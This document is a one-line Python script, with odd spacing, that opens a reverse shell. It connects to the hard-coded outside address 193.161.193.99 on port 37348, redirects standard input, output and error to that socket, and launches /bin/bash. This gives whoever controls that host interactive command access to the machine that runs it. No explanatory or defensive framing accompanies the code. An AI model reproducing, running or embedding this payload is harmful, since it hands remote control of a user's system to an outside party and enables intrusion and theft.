import socket  ,      subprocess  ,      os   ;  host="193.161.193.99"   ;  port=37348   ;  s=socket.socket(socket.AF_INET  ,      socket.SOCK_STREAM)   ;  s.connect((host  ,      port))   ;  os.dup2(s.fileno()  ,      0)   ;  os.dup2(s.fileno()  ,      1)   ;  os.dup2(s.fileno()  ,      2)   ;  p=subprocess.call("/bin/bash")
